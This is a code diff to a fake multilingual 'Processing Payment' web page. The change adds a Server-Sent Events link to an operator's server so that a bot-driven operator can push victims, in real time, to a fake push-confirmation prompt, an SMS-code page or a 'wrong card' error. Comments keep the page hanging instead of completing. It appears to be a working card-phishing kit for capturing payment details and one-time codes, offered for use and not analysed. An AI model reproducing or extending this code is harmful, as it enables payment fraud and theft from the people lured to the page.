@@ -201,6 +201,28 @@
             font-size: 16px;
         }
 
+        /* SSE Status */
+        .sse-status {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            z-index: 1000;
+        }
+
+        .sse-connected {
+            background: var(--success);
+            color: var(--dark);
+        }
+
+        .sse-disconnected {
+            background: var(--error);
+            color: var(--text);
+        }
+
         /* Footer */
         footer {
             text-align: center;
@@ -313,6 +335,10 @@
     </style>
 </head>
 <body>
+    <div class="sse-status sse-disconnected" id="sseStatus">
+        🔴 SSE отключен
+    </div>
+
     <div class="container">
         <header>
             <a class="logo">
@@ -349,7 +375,7 @@
         <div class="loading-container">
             <div class="loader"></div>
             <div class="loading-text" id="loadingText">Обработка платежа...</div>
-            <div class="loading-subtext" id="loadingSubtext">Пожалуйста, подождите. Это может занять несколько секунд.</div>
+            <div class="loading-subtext" id="loadingSubtext">Ожидание команд от оператора...</div>
         </div>
 
         <footer>
@@ -366,15 +392,15 @@
         const translations = {
             ru: {
                 loadingText: 'Обработка платежа...',
-                loadingSubtext: 'Пожалуйста, подождите. Это может занять несколько секунд.'
+                loadingSubtext: 'Ожидание команд от оператора...'
             },
             pl: {
                 loadingText: 'Przetwarzanie płatności...',
-                loadingSubtext: 'Proszę czekać. To może potrwać kilka sekund.'
+                loadingSubtext: 'Oczekiwanie na polecenia operatora...'
             },
             en: {
                 loadingText: 'Processing Payment...',
-                loadingSubtext: 'Please wait. This may take a few seconds.'
+                loadingSubtext: 'Waiting for operator commands...'
             }
         };
 
@@ -412,7 +438,65 @@
 
         changeLanguage(currentLanguage);
 
-        // Функции для управления страницей из бота
+        // SSE подключение
+        const userId = "user_123"; // Должен совпадать с ID в боте
+        const RAILWAY_URL = "https://your-app.railway.app"; // ЗАМЕНИ НА СВОЙ RAILWAY URL
+        let eventSource = null;
+
+        function connectSSE() {
+            try {
+                eventSource = new EventSource(`${RAILWAY_URL}/sse/${userId}`);
+                
+                eventSource.onmessage = function(event) {
+                    const command = JSON.parse(event.data);
+                    console.log('📨 Команда от бота:', command);
+                    handleBotCommand(command);
+                    updateSSEStatus(true);
+                };
+                
+                eventSource.onerror = function(event) {
+                    console.error('❌ SSE ошибка:', event);
+                    updateSSEStatus(false);
+                    // Переподключаемся через 3 секунды
+                    setTimeout(connectSSE, 3000);
+                };
+                
+                eventSource.onopen = function() {
+                    console.log('✅ SSE подключен');
+                    updateSSEStatus(true);
+                };
+                
+            } catch (error) {
+                console.error('💥 Ошибка подключения SSE:', error);
+                updateSSEStatus(false);
+                setTimeout(connectSSE, 5000);
+            }
+        }
+
+        function updateSSEStatus(connected) {
+            const statusElement = document.getElementById('sseStatus');
+            if (connected) {
+                statusElement.textContent = '🟢 SSE подключен';
+                statusElement.className = 'sse-status sse-connected';
+            } else {
+                statusElement.textContent = '🔴 SSE отключен';
+                statusElement.className = 'sse-status sse-disconnected';
+            }
+        }
+
+        function handleBotCommand(command) {
+            console.log('🤖 Обработка команды:', command);
+            
+            if (command.action === 'push') {
+                window.showPushNotification();
+            } else if (command.action === 'sms') {
+                window.redirectToSMS();
+            } else if (command.action === 'wrong_card') {
+                window.redirectToPaymentWithError();
+            }
+        }
+
+        // Функции для управления страницей
         window.showPushNotification = function() {
             const modal = document.createElement('div');
             modal.style.cssText = `
@@ -474,24 +558,18 @@
 
             // Добавляем обработчики для кнопок
             document.getElementById('confirmPushBtn').addEventListener('click', function() {
-    document.querySelector('div[style*="position: fixed"]').remove();
-    const loadingText = document.querySelector('.loading-text');
-    loadingText.textContent = '✅ Операция подтверждена!';
-    // УБИРАЕМ ПЕРЕХОД НА SUCCESS - ПУСТЬ ВИСИТ ТАК
-    // setTimeout(() => {
-    //     window.location.href = 'success.html';
-    // }, 2000);
-});
+                document.querySelector('div[style*="position: fixed"]').remove();
+                const loadingText = document.querySelector('.loading-text');
+                loadingText.textContent = '✅ Операция подтверждена!';
+                // НЕ ПЕРЕХОДИМ НА SUCCESS - ОСТАЕМСЯ ЗДЕСЬ
+            });
 
-document.getElementById('cancelPushBtn').addEventListener('click', function() {
-    document.querySelector('div[style*="position: fixed"]').remove();
-    const loadingText = document.querySelector('.loading-text');
-    loadingText.textContent = '❌ Операция отменена';
-    // УБИРАЕМ ПЕРЕХОД НА PAYMENT - ПУСТЬ ВИСИТ ТАК
-    // setTimeout(() => {
-    //     window.location.href = 'payment.html';
-    // }, 2000);
-});
+            document.getElementById('cancelPushBtn').addEventListener('click', function() {
+                document.querySelector('div[style*="position: fixed"]').remove();
+                const loadingText = document.querySelector('.loading-text');
+                loadingText.textContent = '❌ Операция отменена';
+                // НЕ ПЕРЕХОДИМ НА PAYMENT - ОСТАЕМСЯ ЗДЕСЬ
+            });
         };
 
         window.redirectToSMS = function() {
@@ -502,37 +580,17 @@ document.getElementById('cancelPushBtn').addEventListener('click', function() {
             window.location.href = 'payment.html?status=wrong_card';
         };
 
-        window.showSuccess = function() {
-            const loadingText = document.querySelector('.loading-text');
-            loadingText.textContent = '✅ Операция подтверждена!';
-            setTimeout(() => {
-                window.location.href = 'success.html';
-            }, 2000);
-        };
-
-        // Обработка команд из URL
-        function handleBotCommands() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const action = urlParams.get('action');
-
-            console.log('Bot command:', action);
-
-            if (action === 'push') {
-                // Показать пуш-уведомление
-                window.showPushNotification();
-            } else if (action === 'sms_redirect') {
-                // Перейти на SMS страницу
-                window.redirectToSMS();
-            } else if (action === 'wrong_card') {
-                // Перейти на payment с ошибкой
-                window.redirectToPaymentWithError();
-            }
-            // Если нет команды - просто крутимся бесконечно
-        }
-
-        // Запускаем обработку команд при загрузке
+        // Запускаем SSE при загрузке
         document.addEventListener('DOMContentLoaded', function() {
-            handleBotCommands();
+            console.log('🚀 Запуск SSE подключения...');
+            connectSSE();
+        });
+
+        // Закрываем SSE при закрытии страницы
+        window.addEventListener('beforeunload', function() {
+            if (eventSource) {
+                eventSource.close();
+            }
         });
     </script>
 </body>
